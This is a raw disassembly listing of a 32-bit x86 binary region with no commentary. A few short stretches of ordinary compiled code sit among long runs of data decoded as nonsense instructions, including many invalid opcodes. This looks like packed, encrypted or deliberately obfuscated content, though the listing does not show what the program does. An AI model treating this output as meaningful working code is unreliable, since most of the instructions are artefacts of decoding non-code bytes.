  40e44f:	outs   dx,BYTE PTR ds:[esi]
  40e450:	loope  0x40e42e
  40e452:	dec    edi
  40e453:	jb     0x40e41f
  40e455:	mov    cl,0xda
  40e457:	enterw 0x2c9e,0xe2
  40e45c:	sahf   
  40e45d:	jg     0x40e44f
  40e45f:	mov    al,ds:0x3d54ab63
  40e464:	lahf   
  40e465:	mov    WORD PTR ds:0x15148ac2,ss
  40e46b:	xchg   DWORD PTR ds:0xa9908678,edx
  40e471:	bnd jmp 0x40e4c2
  40e474:	and    BYTE PTR [edi-0x54],dl
  40e477:	xor    al,0x3a
  40e479:	mov    DWORD PTR [eax+0x5a],esp
  40e47c:	sti    
  40e47d:	jecxz  0x40e456
  40e47f:	ret    
  40e480:	cld    
  40e481:	mov    eax,ds:0x41eb06
  40e486:	push   0x41ea5c
  40e48b:	push   DWORD PTR [eax]
  40e48d:	call   0x419198
  40e492:	jmp    0x40e979
  40e497:	cmp    edi,0x13c
  40e49d:	jne    0x40e979
  40e4a3:	mov    eax,DWORD PTR [ebp-0x10]
  40e4a6:	jmp    0x40e6fe
  40e4ab:	sar    DWORD PTR ds:[esi],0xca
  40e4af:	ror    ecx,0xca
  40e4b2:	leave  
  40e4b3:	(bad)  
  40e4b4:	dec    eax
  40e4b5:	cmc    
  40e4b6:	adc    eax,edi
  40e4b8:	(bad)  
  40e4b9:	mov    DWORD PTR [ecx],0x7878b502
  40e4bf:	xor    eax,0xd578787e
  40e4c4:	stos   DWORD PTR es:[edi],eax
  40e4c5:	arpl   WORD PTR [esi+0x56858e15],dx
  40e4cb:	jmp    0x34a4:0xe1870144
  40e4d2:	pop    edi
  40e4d3:	adc    eax,0xa3ae091
  40e4d8:	jmp    0x4d0dfef0
  40e4dd:	popf   
  40e4de:	stc    
  40e4df:	mov    eax,0xb7edace7
  40e4e4:	sbb    dl,BYTE PTR [esi+eiz*1+0x2]
  40e4e8:	mov    ebx,0xbda950
  40e4ed:	jge    0x40e47b
  40e4ef:	bound  ebp,QWORD PTR [edi]
  40e4f1:	mov    esi,0x721d4578
  40e4f6:	cdq    
  40e4f7:	adc    dh,BYTE PTR [ecx+0x3c559bc8]
  40e4fd:	stos   DWORD PTR es:[edi],eax
  40e4fe:	xor    eax,0xbd114272
  40e503:	mul    BYTE PTR [edi]
  40e505:	(bad)  
  40e506:	int3   
  40e507:	and    BYTE PTR [edi],bl
  40e509:	adc    BYTE PTR [eax+0x2d947ad4],bl
  40e50f:	loopne 0x40e535
  40e511:	add    ebp,DWORD PTR [ebx-0x57f09500]
  40e517:	in     al,0x9
  40e519:	push   0x3b0033d3
  40e51e:	rcr    DWORD PTR [edi+esi*8+0x6dff8031],cl
  40e525:	pop    ebp
  40e526:	cmp    ah,dh
  40e528:	ret    0xa6ba
  40e52b:	inc    esi
  40e52c:	call   0x201a6b30
  40e531:	pop    edx
  40e532:	mov    ebp,ebx
  40e534:	sbb    BYTE PTR [ebx+0x25],0xe
  40e538:	and    DWORD PTR [ebx-0x278a716a],ebp
  40e53e:	or     edi,DWORD PTR [ebp+0x54]
  40e541:	mov    ah,0x51
  40e543:	stc    
  40e544:	dec    edi
  40e545:	xchg   esi,eax
  40e546:	xlat   BYTE PTR ds:[ebx]
  40e547:	cmp    cl,cl
  40e549:	dec    edi
  40e54a:	mov    edx,0x5a71ad4b
  40e54f:	pop    ecx
  40e550:	mov    al,ds:0x18333889
  40e555:	ror    DWORD PTR [edi],1
  40e557:	xchg   ebp,eax
  40e558:	cwde   
  40e559:	jp     0x40e518
  40e55b:	jns    0x40e5a4
  40e55d:	and    esi,DWORD PTR [esi+0x76768e8a]
  40e563:	pop    es
  40e564:	fwait
  40e565:	sub    DWORD PTR [ebx-0x7b],ebx
  40e568:	ins    BYTE PTR es:[edi],dx
  40e569:	lock pop esi
  40e56b:	mov    ch,0x76
  40e56d:	nop
  40e56e:	outs   dx,DWORD PTR ds:[esi]
  40e56f:	push   ebx
  40e570:	push   0xa8ff0fdc
  40e575:	test   edx,ebx
  40e577:	push   ebp
  40e578:	mov    dh,0xf8
  40e57a:	jp     0x40e56c
  40e57c:	je     0x40e509
  40e57e:	test   DWORD PTR [edx-0x1f9d5511],eax
  40e584:	fisubr DWORD PTR [ebp+0x57]
  40e587:	cld    
  40e588:	mov    edx,0xe0a047b4
  40e58d:	jmp    0x82ee:0xeb3d5f14
  40e594:	fwait
  40e595:	enter  0xfa88,0x1
  40e599:	xor    eax,0x1ad2feec
  40e59e:	ret    
  40e59f:	add    ah,BYTE PTR [ecx]
  40e5a1:	adc    edi,edx
  40e5a3:	adc    BYTE PTR [ecx-0x5],bh
  40e5a6:	mov    ds:0x2684c286,al
  40e5ab:	aaa    
  40e5ac:	not    BYTE PTR [eax+eax*4+0x2c65d03]
  40e5b3:	jb     0x40e55f
  40e5b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5b6:	lods   al,BYTE PTR ds:[esi]
  40e5b7:	mov    esp,0x9312ab44
  40e5bc:	push   edi
  40e5bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5be:	mov    DWORD PTR [ebx+0xe],0xc5da5902
  40e5c5:	retf   0x8eca
  40e5c8:	push   esi
  40e5c9:	push   edi
  40e5ca:	out    0x1f,al
  40e5cc:	xchg   BYTE PTR [ecx-0x44461644],dl
  40e5d2:	aas    
  40e5d3:	push   es
  40e5d4:	jns    0x40e61d
  40e5d6:	ss jno 0x40e585
  40e5d9:	dec    esp
  40e5da:	inc    edx
  40e5db:	daa    
  40e5dc:	push   ebp
  40e5dd:	fs pop esp
  40e5df:	push   esi
  40e5e0:	loopne 0x40e5df
  40e5e2:	dec    edi
  40e5e3:	mov    dl,0xfc
  40e5e5:	mov    ?,WORD PTR [eax]
  40e5e7:	sub    al,0xe7
  40e5e9:	jno    0x40e64a
  40e5eb:	lahf   
  40e5ec:	js     0x40e5e4
  40e5ee:	fdiv   DWORD PTR [esi]
  40e5f0:	test   al,0xc7
  40e5f2:	not    BYTE PTR [edx]
  40e5f4:	or     cl,BYTE PTR [esi]
  40e5f6:	push   0x1b
  40e5f8:	xlat   BYTE PTR ds:[ebx]
  40e5f9:	int3   
  40e5fa:	mov    dh,0x93
  40e5fc:	aas    
  40e5fd:	and    esi,ebx
  40e5ff:	fucom  st(2)
  40e601:	iret   
  40e602:	test   eax,0x8fca21e1
  40e607:	mov    esi,0x1254d698
  40e60c:	mov    ds:0xf81c1dc0,eax
  40e611:	xchg   edi,eax
  40e612:	pop    esp
  40e613:	enter  0x275c,0xe
  40e617:	jl     0x40e669
  40e619:	cli    
  40e61a:	jne    0x40e661
  40e61c:	jp     0x40e689
  40e61e:	jl     0x40e5c3
  40e620:	ds and dl,0xb3
  40e624:	stos   BYTE PTR es:[edi],al
  40e625:	mov    ds:0x8388c869,eax
  40e62a:	push   ds
  40e62b:	nop
  40e62c:	xor    eax,0xc3512557
  40e631:	dec    ebx
  40e632:	(bad)  
  40e633:	jne    0x40e602
  40e635:	dec    edi
  40e636:	pusha  
  40e637:	pop    esi
  40e638:	mov    eax,0x2de88731
  40e63d:	jbe    0x40e6a8
  40e63f:	scas   eax,DWORD PTR es:[edi]
  40e640:	inc    ebp
  40e641:	retf   0x4d04
  40e644:	pusha  
  40e645:	jno    0x40e5da
  40e647:	icebp  
  40e648:	lahf   
  40e649:	adc    al,dh
  40e64b:	cmp    BYTE PTR [ecx],0x5a
  40e64e:	mov    ds:0x85bdf625,al
  40e653:	daa    
  40e654:	mov    dl,0x89
  40e656:	lock (bad) 
  40e658:	outs   dx,BYTE PTR ds:[esi]
  40e659:	inc    ebx
  40e65a:	mov    ebp,0x97d95395
  40e65f:	outs   dx,DWORD PTR ds:[esi]
  40e660:	pop    esp
  40e661:	lock add dl,bh
  40e664:	ins    DWORD PTR es:[edi],dx
  40e665:	jb     0x40e64e
  40e667:	adc    ch,al
  40e669:	xchg   ebx,eax
  40e66a:	pusha  
  40e66b:	push   0x1b
  40e66d:	ffreep st(3)
  40e66f:	and    al,0x6b
  40e671:	pop    eax
  40e672:	jb     0x40e6b9
  40e674:	jae    0x40e61a
  40e676:	xchg   edx,eax
  40e677:	dec    esp
  40e678:	xchg   edx,eax
  40e679:	fnsave [edx-0x22d73df6]
  40e67f:	mov    eax,ds:0xbd109b3d
  40e684:	inc    edi
  40e685:	fsub   DWORD PTR [edi+0x20eeaacb]
  40e68b:	lea    ebp,[ebx]
  40e68d:	xchg   BYTE PTR [eax+0x244579df],dh
  40e693:	sub    edx,DWORD PTR [ecx+ebx*4+0x53]
  40e697:	adc    eax,0x562a225f
  40e69c:	daa    
  40e69d:	in     al,dx
  40e69e:	jl     0xcda1b070
  40e6a4:	sti    
  40e6a5:	popf   
  40e6a6:	push   esi
  40e6a7:	pop    ds
  40e6a8:	in     eax,dx
  40e6a9:	sub    BYTE PTR [ebp+ecx*2+0x2f],0xe4
  40e6ae:	sub    eax,0x3f12cf22
  40e6b3:	jns    0x40e67c
  40e6b5:	push   0x1d62df92
  40e6ba:	and    cl,BYTE PTR [eax*2+0x1e32232c]
  40e6c1:	dec    eax
  40e6c2:	add    eax,0x3850a1d3
  40e6c7:	mov    ds:0x229aba46,eax
  40e6cc:	xchg   ebx,eax
  40e6cd:	ss into 
  40e6cf:	inc    edx
  40e6d0:	add    BYTE PTR ds:0x567e5986,al
  40e6d6:	and    al,BYTE PTR [ebp-0x4f4e40ad]
  40e6dc:	or     edx,DWORD PTR [esi+ecx*1+0x284171c4]
  40e6e3:	out    dx,al
  40e6e4:	in     eax,0x61
  40e6e6:	adc    DWORD PTR gs:[eax+esi*1-0x266f4884],ecx
  40e6ee:	in     al,dx
  40e6ef:	push   cs
  40e6f0:	call   0xc1b7:0x686f60de
  40e6f7:	sbb    al,0xb
  40e6f9:	mov    ah,0x36
  40e6fb:	jno    0x40e754
  40e6fd:	aas    
  40e6fe:	xor    eax,esi
  40e700:	add    eax,ebx
  40e702:	mov    DWORD PTR [ebp+0x8],eax
  40e705:	mov    eax,ds:0x41eae6
  40e70a:	mov    DWORD PTR [ebp+0x8],eax
  40e70d:	mov    eax,DWORD PTR [ebp-0x14]
  40e710:	mov    DWORD PTR [ebp-0x4],eax
  40e713:	mov    eax,DWORD PTR [ebp-0x4]
  40e716:	push   0x4
  40e718:	pop    ecx
  40e719:	sub    ecx,eax
  40e71b:	add    ecx,DWORD PTR [ebp-0x18]
  40e71e:	mov    DWORD PTR [ebp-0x8],ecx
  40e721:	jmp    0x40e979
  40e726:	(bad)
  40e729:	(bad)  
  40e72a:	leave  
  40e72b:	fcmovbe st,st(5)
  40e72d:	sar    esp,1
  40e72f:	rcr    DWORD PTR [esp+edi*1],1
  40e732:	mov    cl,0xa0
  40e734:	clc    
  40e735:	lods   al,BYTE PTR ds:[esi]
  40e736:	aas    
  40e737:	mov    ebx,0x7e357878
  40e73c:	js     0x40e7b6
  40e73e:	xor    ch,BYTE PTR [edi+0x6217d8f8]
  40e744:	iret   
  40e745:	cmp    BYTE PTR ss:[eax],cl
  40e748:	into   
  40e749:	xchg   edi,eax
  40e74a:	out    0x6a,al
  40e74c:	jp     0x40e790
  40e74e:	sub    BYTE PTR es:[eax],0xf0
  40e752:	fcomp  QWORD PTR [ebp-0x78]
  40e755:	(bad)  
  40e756:	adc    ecx,edx
  40e758:	fidivr WORD PTR ds:0xb5cc3dca
  40e75e:	fndisi(8087 only) 
  40e760:	push   edx
  40e761:	mov    ah,0x2f
  40e763:	or     BYTE PTR [ebp-0x3e],al
  40e766:	cld    
  40e767:	lods   eax,DWORD PTR ds:[esi]
  40e768:	xchg   esi,eax
  40e769:	add    al,0x64
  40e76b:	rcl    BYTE PTR [ecx+0x1e719163],0xc8
  40e772:	inc    edx
  40e773:	out    0xaa,eax
  40e775:	dec    DWORD PTR [esi-0x4e]
  40e778:	push   ss
  40e779:	xor    dh,BYTE PTR [edx]
  40e77b:	in     al,0x4d
  40e77d:	addr16 mov cl,0x31
  40e780:	mov    esi,0xdc978027
  40e785:	add    ebp,esp
  40e787:	stc    
  40e788:	std    
  40e789:	stos   DWORD PTR es:[edi],eax
  40e78a:	cli    
  40e78b:	pop    ecx
  40e78c:	inc    ebp
  40e78d:	out    0x24,al
  40e78f:	stos   BYTE PTR es:[edi],al
  40e790:	cwde   
  40e791:	xor    DWORD PTR [eax-0x75bf5d8a],edi
  40e797:	(bad)  
  40e798:	idiv   eax
  40e79a:	ja     0x40e7af
  40e79c:	cmp    DWORD PTR [ebx],ebx
  40e79e:	sahf   
  40e79f:	loop   0x40e782
  40e7a1:	test   DWORD PTR [ebx-0x1dff6e49],eax
  40e7a7:	jge    0x40e776
  40e7a9:	dec    esp
  40e7aa:	push   ds
  40e7ab:	aad    0x72
  40e7ad:	lock jle 0x40e80f
  40e7b0:	mov    esp,0x4d160079
  40e7b5:	fistp  DWORD PTR [eax+edi*2]
  40e7b8:	das    
  40e7b9:	jg     0x40e77a
  40e7bb:	mov    eax,?
  40e7bd:	sbb    DWORD PTR [eax+0x70],ebp
  40e7c0:	sbb    al,0xe9
  40e7c2:	push   ecx
  40e7c3:	add    ebp,ecx
  40e7c5:	cmp    edi,DWORD PTR [ebp+0x6c]
  40e7c8:	sti    
  40e7c9:	sysenter 
  40e7cb:	mov    ecx,0xa2b6b85c
  40e7d0:	and    al,0x37
  40e7d2:	sbb    al,0x25
  40e7d4:	jbe    0x40e789
  40e7d6:	in     al,0xbd
  40e7d8:	and    BYTE PTR [edi-0x2f],bl
  40e7db:	cmp    al,0xc6
  40e7dd:	adc    edx,ebx
  40e7df:	int3   
  40e7e0:	jmp    0x83fa:0xcd0e0d5f
  40e7e7:	adc    eax,0xce2a8548
  40e7ec:	retf   0x885c
  40e7ef:	pop    DWORD PTR [esi+0x78cb803b]
  40e7f5:	in     eax,0xe1
  40e7f7:	mov    bh,0x10
  40e7f9:	int    0x78
  40e7fb:	rcr    DWORD PTR [eax+0xa],cl
  40e7fe:	mov    esp,0x663894be
  40e803:	xchg   edx,eax
  40e804:	ficom  WORD PTR [ebp+0x4cae64e1]
  40e80a:	pop    ss
  40e80b:	hlt    
  40e80c:	jb     0x40e7a7
  40e80e:	cmp    dl,BYTE PTR [edx]
  40e810:	ins    DWORD PTR es:[edi],dx
  40e811:	nop
  40e812:	rcr    BYTE PTR [esi+0x56],1
  40e815:	popf   
  40e816:	and    al,BYTE PTR ds:0x33d86512
  40e81c:	push   edi
  40e81d:	lods   al,BYTE PTR ds:[esi]
  40e81e:	lods   al,BYTE PTR ds:[esi]
  40e81f:	loop   0x40e863
  40e821:	pop    edi
  40e822:	jns    0x40e805
  40e824:	add    DWORD PTR [edx+esi*1],0xffffff85
  40e828:	mov    gs,WORD PTR [eax]
  40e82a:	(bad)  
  40e82b:	sbb    DWORD PTR [ebx+0x48],ebp
  40e82e:	push   ebp
  40e82f:	cmp    esi,DWORD PTR [esi-0x74]
  40e832:	sahf   
  40e833:	out    dx,eax
  40e834:	addr16 cmp al,0xb7
  40e837:	aas    
  40e838:	push   es
  40e839:	lods   eax,DWORD PTR ds:[esi]
  40e83a:	push   0xffffffb4
  40e83c:	xor    al,0x7e
  40e83e:	jae    0x40e81b
  40e840:	ret    
  40e841:	(bad)  
  40e842:	out    dx,eax
  40e843:	xlat   BYTE PTR ds:[ebx]
  40e844:	jge    0x40e802
  40e846:	inc    ebp
  40e847:	mov    ch,0xc9
  40e849:	call   0x752c:0x2478f733
  40e850:	mov    cl,0x85
  40e852:	call   0xcc8966a
  40e857:	mov    eax,0x8fd6a38e
  40e85c:	stc    
  40e85d:	jne    0x40e8cb
  40e85f:	dec    esp
  40e860:	or     bh,BYTE PTR [edi+esi*1]
  40e863:	xor    ah,BYTE PTR [edx-0x38]
  40e866:	mov    edi,0xf99da3a1
  40e86b:	mov    DWORD PTR [ecx+eiz*1-0x2a],ebp
  40e86f:	mov    cl,0x73
  40e871:	sar    BYTE PTR [edi+0x4d],0xf7
  40e875:	outs   dx,BYTE PTR ds:[esi]
  40e876:	inc    ecx
  40e877:	lods   eax,DWORD PTR ds:[esi]
  40e878:	(bad)  
  40e879:	cmp    ch,BYTE PTR [eax-0x71]
  40e87c:	stos   DWORD PTR es:[edi],eax
  40e87d:	in     eax,dx
  40e87e:	stos   DWORD PTR es:[edi],eax
  40e87f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e880:	pop    esi
  40e881:	ds xchg ebp,eax
  40e883:	add    DWORD PTR [esi+0x69b06d38],ebp
  40e889:	scas   al,BYTE PTR es:[edi]
  40e88a:	test   BYTE PTR [ebp+0x76e9e9f6],dl
  40e890:	outs   dx,DWORD PTR ds:[esi]
  40e891:	arpl   WORD PTR ds:0xe95d2d31,sp
  40e897:	jb     0x40e8d0
  40e899:	pop    ebp
  40e89a:	and    eax,0xddc1707e
  40e89f:	(bad)  
  40e8a0:	addr16 cmp bl,0xcc
  40e8a4:	or     DWORD PTR [edx-0x2b],esp
  40e8a7:	push   esp
  40e8a8:	rcl    BYTE PTR [eax+0x28],0xe2
  40e8ac:	mov    bh,BYTE PTR [edx-0xd5dca07]
  40e8b2:	in     al,dx
  40e8b3:	mov    ecx,0x657d1f5b
  40e8b8:	(bad)  
  40e8ba:	push   0xffffffad
  40e8bc:	iret   
  40e8bd:	pop    ss
  40e8be:	push   edi
  40e8bf:	imul   ebx,ecx,0x44ddf38f
  40e8c5:	pushf  
  40e8c6:	sbb    BYTE PTR [ebx-0x7bd890b0],0x39
  40e8cd:	cmp    cl,ah
  40e8cf:	into   
  40e8d0:	pmaddwd mm6,QWORD PTR [eax-0x2e]
  40e8d4:	fs lahf 
  40e8d6:	pushf  
  40e8d7:	push   DWORD PTR [ebp-0x18]
  40e8da:	add    eax,0x3ff2e1f1
  40e8df:	add    esi,DWORD PTR cs:[edi-0x1d]
  40e8e3:	xchg   edx,eax
  40e8e4:	je     0x40e93f
  40e8e6:	mov    ?,WORD PTR [ebp+0x13]
  40e8e9:	lds    esi,FWORD PTR [edx]
  40e8eb:	stc    
  40e8ec:	out    0x7a,eax
  40e8ee:	mov    WORD PTR [ecx+esi*8+0x35],es
  40e8f2:	xchg   esp,eax
  40e8f3:	or     DWORD PTR [edi],0x1afb4efa
  40e8f9:	mov    ah,0x82
  40e8fb:	push   ebx
  40e8fc:	pop    edi
  40e8fd:	mov    ebp,ecx
  40e8ff:	js     0x40e90f
  40e901:	add    BYTE PTR [ebx+0x73],al
  40e904:	arpl   cx,cx
  40e906:	lock js 0x40e908
  40e909:	addr16 aas 
  40e90b:	shr    BYTE PTR [eax+edx*4+0x47],0xad
  40e910:	sbb    al,0x8d
  40e912:	stc    
  40e913:	pop    ecx
  40e914:	dec    ecx
  40e915:	pop    ebx
  40e916:	std    
  40e917:	sbb    cl,al
  40e919:	mov    cl,0xfe
  40e91b:	or     ch,BYTE PTR [esp+edx*2+0x7ca40b9d]
  40e922:	bound  ebx,QWORD PTR [edi-0x382a7b46]
  40e928:	popf   
  40e929:	dec    esp
  40e92a:	fucomip st,st(1)
  40e92c:	test   BYTE PTR [ebp+0x4dda405b],0xee
  40e933:	xor    al,0xd2
  40e935:	mov    ds:0xe847d91b,al
  40e93a:	cmp    esp,esi
  40e93c:	lea    ebp,[edx+0x3e]
  40e93f:	mov    eax,ds:0xd01ce07e
  40e944:	sbb    BYTE PTR [eax],al
  40e946:	xchg   edi,eax
  40e947:	loopne 0x40e9b6
  40e949:	stc    
  40e94a:	or     BYTE PTR [edx],0xa6
  40e94d:	sbb    al,0x54
  40e94f:	fucom  st(3)
  40e951:	nop
  40e952:	adc    al,0x33
  40e954:	ja     0x40e9c5
  40e956:	int3   
  40e957:	or     eax,0x7d16991d
  40e95c:	lock pop ecx
  40e95e:	jmp    0x40e920
  40e960:	dec    esp
  40e961:	adc    eax,0x2f6e3d8e
  40e966:	xchg   esi,eax
  40e967:	pop    ecx
  40e968:	push   ebp
  40e969:	lahf   
  40e96a:	int    0xb9
  40e96c:	mov    ds:0xed530ca7,eax
  40e971:	(bad)  
  40e972:	in     eax,0xeb
  40e974:	bound  ecx,QWORD PTR [esi-0x74a7d55c]
  40e97a:	inc    ebp
  40e97b:	or     al,0x33
  40e97d:	(bad)  
  40e97e:	lea    edi,[edi+eax*1+0x327298]
  40e985:	cmp    edi,0x50a
  40e98b:	jne    0x40d51f
  40e991:	mov    eax,DWORD PTR [ebp+0xc]
  40e994:	pop    edi
  40e995:	xor    eax,esi
  40e997:	pop    esi
  40e998:	add    eax,ebx
  40e99a:	pop    ebx
  40e99b:	leave  
  40e99c:	ret    0x8
  40e99f:	push   ebp
  40e9a0:	mov    ebp,esp
  40e9a2:	sub    esp,0x44
  40e9a5:	push   edi
  40e9a6:	mov    eax,DWORD PTR [ebp+0xc]
  40e9a9:	mov    DWORD PTR [ebp-0x10],eax
  40e9ac:	mov    eax,DWORD PTR [ebp+0x8]
  40e9af:	and    DWORD PTR ds:0x42a7f1,0x0
  40e9b9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9bf:	inc    edx
  40e9c0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9c6:	cmp    DWORD PTR ds:0x42a7f1,0x6
  40e9cd:	jne    0x40e9dc
  40e9d3:	push   DWORD PTR [ebp-0x28]
  40e9d6:	call   DWORD PTR ds:0x41d250
  40e9dc:	cmp    DWORD PTR ds:0x42a7f1,0x5
  40e9e3:	jne    0x40e9f6
  40e9e9:	mov    edx,DWORD PTR ds:0x42a7f1
  40e9ef:	inc    edx
  40e9f0:	mov    DWORD PTR ds:0x42a7f1,edx
  40e9f6:	cmp    DWORD PTR ds:0x42a7f1,0x10
  40e9fd:	jb     0x40e9b9
  40ea03:	mov    DWORD PTR [ebp+0x8],0xf89c8538
  40ea0a:	mov    DWORD PTR [ebp-0x20],0xf89c8539
  40ea11:	jmp    0x40ec99
  40ea16:	cmp    eax,0xd6ce3ed7
  40ea1b:	aad    0xcd
  40ea1d:	xlat   BYTE PTR ds:[ebx]
  40ea1e:	jecxz  0x40e9ce
  40ea20:	ja     0x40e9b6
  40ea22:	jns    0x40ea60
  40ea24:	xor    ebx,DWORD PTR [esp+esi*8]
  40ea27:	mov    ecx,0x7ee57878
  40ea2c:	js     0x40eaa6
  40ea2e:	xor    BYTE PTR [ebp-0x4b],0x36
  40ea32:	xor    BYTE PTR ds:0xe70599b5,al
  40ea38:	cdq    
  40ea39:	hlt    
  40ea3a:	mov    cl,0x56
  40ea3c:	out    dx,eax
  40ea3d:	inc    esp
  40ea3e:	add    eax,0xbb85648d
  40ea43:	sub    ah,bl
  40ea45:	xchg   ecx,eax
  40ea46:	adc    BYTE PTR [ebx],ch
  40ea48:	pop    ds
  40ea49:	pop    ss
  40ea4a:	int    0x7f
  40ea4c:	loop   0x40eaba
  40ea4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ea4f:	scas   al,BYTE PTR es:[edi]
  40ea50:	ret    
  40ea51:	or     bh,bh
  40ea53:	jge    0x40eac5
  40ea55:	ja     0x40ea68
  40ea57:	dec    edx
  40ea58:	pop    ecx
  40ea59:	and    esi,eax
  40ea5b:	inc    ecx
  40ea5c:	xor    eax,0xbbbf958a
  40ea61:	push   esp
  40ea62:	pusha  
  40ea63:	lahf   
  40ea64:	fwait
  40ea65:	adc    al,0x40
  40ea67:	in     al,0x62
  40ea69:	pop    ebx
  40ea6a:	test   DWORD PTR [ebp+eiz*8+0x4739d92b],eax
  40ea71:	and    ah,al
  40ea73:	cmp    al,0x62
  40ea75:	and    BYTE PTR [eax],bh
  40ea77:	inc    esi
  40ea78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea79:	pop    ss
  40ea7a:	inc    edx
  40ea7b:	int    0x18
  40ea7d:	aaa    
  40ea7e:	xor    eax,0xb1969516
  40ea83:	cdq    
  40ea84:	pop    ecx
  40ea85:	stos   DWORD PTR es:[edi],eax
  40ea86:	sub    al,0xc3
  40ea88:	mov    ah,0x59
  40ea8a:	mov    dl,0x90
  40ea8c:	fmul   st(2),st
  40ea8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea8f:	fild   QWORD PTR [ebp-0x57]
  40ea92:	sub    eax,DWORD PTR [ecx-0x7109fb19]
  40ea98:	jnp    0x40ea5e
  40ea9a:	fdiv   DWORD PTR [ebp+ecx*8+0x31]
  40ea9e:	adc    ah,dh
  40eaa0:	push   eax
  40eaa1:	popf   
  40eaa2:	mov    bh,0x13
  40eaa4:	call   0xf25be1de
  40eaa9:	or     DWORD PTR [ebx+ecx*8-0x39],0x1a9da78b
  40eab1:	in     eax,0x6c
  40eab3:	xchg   ebp,eax
  40eab4:	jnp    0x40eab6
  40eab6:	shl    BYTE PTR [ecx+eiz*1+0x4c],0xb
  40eabb:	or     bh,BYTE PTR [ebx+0x43]
  40eabe:	sub    eax,0x98960f61
  40eac3:	sub    ebx,DWORD PTR [ebx+0x4fb99777]
  40eac9:	in     eax,dx
  40eaca:	push   esi
  40eacb:	retf   0xb807
  40eace:	popf   
  40eacf:	cmp    bl,BYTE PTR [eax+eax*2-0x35]
  40ead3:	pop    edi
  40ead4:	into   
  40ead5:	fld    QWORD PTR [esi-0x13]
  40ead8:	daa    
  40ead9:	popa   
  40eada:	pop    edi
  40eadb:	cs fs inc edi
  40eade:	and    eax,0xcd66af87
  40eae3:	push   cs
  40eae4:	pop    ds
  40eae5:	mov    ah,0xb7
  40eae7:	pop    ebp
  40eae8:	xchg   edx,eax
  40eae9:	mov    bh,BYTE PTR [ebp+eiz*2+0x2c0e4ede]
  40eaf0:	dec    edx
  40eaf1:	call   0xd3477d98
  40eaf6:	cld    
  40eaf7:	inc    ebx
  40eaf8:	xor    al,0xbb
  40eafa:	arpl   WORD PTR ds:0xca3c9a57,sp
  40eb00:	or     ecx,DWORD PTR [edi]
  40eb02:	ret    0x9756
  40eb05:	in     al,dx
  40eb06:	jnp    0x40eab4
  40eb08:	mov    bh,0xcd
  40eb0a:	sar    BYTE PTR [esi],cl
  40eb0c:	sbb    eax,DWORD PTR [ebp+0x30]
  40eb0f:	and    eax,0x4fc7c1e6
  40eb14:	ror    DWORD PTR [eax],1
  40eb16:	stos   BYTE PTR es:[edi],al
  40eb17:	vsubpd ymm7,ymm7,YMMWORD PTR [ebx+0x4a6d5769]
  40eb1f:	mov    edi,0x1fa0a185
  40eb24:	sar    DWORD PTR [edx],0x70
  40eb27:	pusha  
  40eb28:	retf   
  40eb29:	add    DWORD PTR [eax+0x16],ebx
  40eb2c:	or     eax,0xafffc590
  40eb31:	rcr    BYTE PTR [eax],1
  40eb33:	ret    0xe960
  40eb36:	inc    edx
  40eb37:	jo     0x40eb62
  40eb39:	inc    ebp
  40eb3a:	loopne 0x40ead5
  40eb3c:	adc    BYTE PTR [edx+0x53],cl
  40eb3f:	add    eax,0xfe29a6fd
  40eb44:	addr16 jae 0x40ebbb
  40eb47:	rol    DWORD PTR [edi],1
  40eb49:	mov    ch,0xc5
  40eb4b:	cs out 0x1e,eax
  40eb4e:	adc    ah,BYTE PTR [edi-0x37753400]
  40eb54:	ins    DWORD PTR es:[edi],dx
  40eb55:	xor    esi,DWORD PTR [ebp+ebx*8+0x769ce114]
  40eb5c:	(bad)  
  40eb5d:	mov    dl,0x5e
  40eb5f:	xor    cl,BYTE PTR [edx+ecx*4]
  40eb62:	scas   al,BYTE PTR es:[edi]
  40eb63:	and    BYTE PTR [eax-0x47],ah
  40eb66:	adc    esi,DWORD PTR [ebp-0x3fb80ca4]
  40eb6c:	pusha  
  40eb6d:	cmp    ah,BYTE PTR [ecx-0x27]
  40eb70:	cmp    edx,esi
  40eb72:	retf   
  40eb73:	bound  ecx,QWORD PTR [edi]
  40eb75:	sub    bh,BYTE PTR [ebp-0x69]
  40eb78:	shl    DWORD PTR [eax+0x2],1
  40eb7b:	mov    esp,0x5769e718
  40eb80:	cli    
  40eb81:	push   edx
  40eb82:	scas   al,BYTE PTR es:[edi]
  40eb83:	arpl   WORD PTR [edx+edx*2-0x46c707c4],bx
  40eb8a:	jl     0x40ebd7
  40eb8c:	sbb    DWORD PTR [edx+0x6dc629c5],0xffffffe1
  40eb93:	loope  0x40eb28
  40eb95:	sub    ah,BYTE PTR [edi+0x70b099df]
  40eb9b:	push   ds
  40eb9c:	xchg   edx,eax
  40eb9d:	push   esi
  40eb9e:	cmp    DWORD PTR [ebp-0x7b3896da],eax
  40eba4:	mov    WORD PTR [edi],cs
  40eba6:	retf   0xd5e6
  40eba9:	dec    edi
  40ebaa:	or     ch,BYTE PTR [edx-0x4e]
  40ebad:	push   ss
  40ebae:	sub    BYTE PTR [esi],cl
  40ebb0:	ja     0x40eb55
  40ebb2:	sub    al,0xcc
  40ebb4:	xchg   ebx,eax
  40ebb5:	mov    esi,0x418bf13b
  40ebba:	xor    dl,al
  40ebbc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebbd:	mov    dl,0xf4
  40ebbf:	add    BYTE PTR [ebx-0x75],dl
  40ebc2:	faddp  st(5),st
  40ebc4:	rol    BYTE PTR [edx+0x3c],1
  40ebc7:	and    eax,0xe75b92fa
  40ebcc:	iret   
  40ebcd:	out    0x64,eax
  40ebcf:	mov    dl,0x90
  40ebd1:	or     eax,0x903b691b
  40ebd6:	les    ebp,FWORD PTR [edi-0x17]
  40ebd9:	icebp  
  40ebda:	adc    dl,BYTE PTR [ebx-0x70]
  40ebdd:	loope  0x40eba3
  40ebdf:	test   BYTE PTR ds:0x3cd7531c,dh
  40ebe5:	sbb    DWORD PTR [ecx+0x796fae5a],ebx
  40ebeb:	dec    ebp
  40ebec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ebed:	outs   dx,DWORD PTR ds:[esi]
